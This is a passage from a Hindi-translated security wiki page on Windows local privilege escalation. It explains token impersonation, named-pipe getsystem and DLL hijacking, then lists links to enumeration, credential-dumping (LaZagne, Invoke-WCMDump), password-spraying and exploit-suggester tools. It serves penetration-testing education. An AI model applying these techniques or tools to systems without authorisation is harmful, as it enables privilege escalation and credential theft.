इस तकनीक का उपयोग आमतौर पर SYSTEM के रूप में चलने वाली किसी भी प्रक्रिया को चुनने के लिए किया जाता है जिसमें सभी token privileges मौजूद हों (_हाँ, आप SYSTEM प्रक्रियाएँ ऐसी भी पाएंगे जिनमें सभी token privileges नहीं होते_)।\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह तकनीक meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग की जाती है। तकनीक में **एक pipe बनाना और फिर उस pipe पर लिखने के लिए एक service create/abuse करना** शामिल है। फिर, वह **server** जिसने pipe बनाया था और जिसने **`SeImpersonate`** privilege का उपयोग किया है, वह pipe client (service) के token को **impersonate** कर पाएगा और SYSTEM privileges प्राप्त कर लेगा।\
यदि आप [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)।\
यदि आप [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) का एक उदाहरण पढ़ना चाहते हैं तो यह पढ़ें।

### Dll Hijacking

यदि आप किसी **dll को hijack** करने में सफल हो जाते हैं जो कि **SYSTEM** के रूप में चल रही किसी **process** द्वारा **loaded** हो रही है, तो आप उन अनुमतियों के साथ arbitrary code execute कर पाएंगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है, और अधिकतर यह High Integrity प्रक्रिया से हासिल करना काफी आसान होता है क्योंकि उस प्रक्रिया के पास dlls लोड करने के लिए उपयोग किए जाने वाले फोल्डरों पर **write permissions** होंगे।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी उपकरण

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी एकत्र करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- संग्रहित पासवर्ड्स को domain में spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजते हुए host को enumerate करता है (ज्यादा जानकारी इकट्ठा करने वाला टूल है बजाय privesc के) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github पर precompiled exe मौजूद)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच (executable github पर precompiled). सिफारिश नहीं। Win10 में अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। सिफारिश नहीं। Win10 में अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित बनाया गया टूल (यह ठीक तरह से काम करने के लिए accesschk की आवश्यकता नहीं है पर यह इसे उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (लोकल python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (लोकल python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको प्रोजेक्ट को सही .NET वर्ज़न का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित होस्ट पर इंस्टॉल .NET वर्ज़न देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
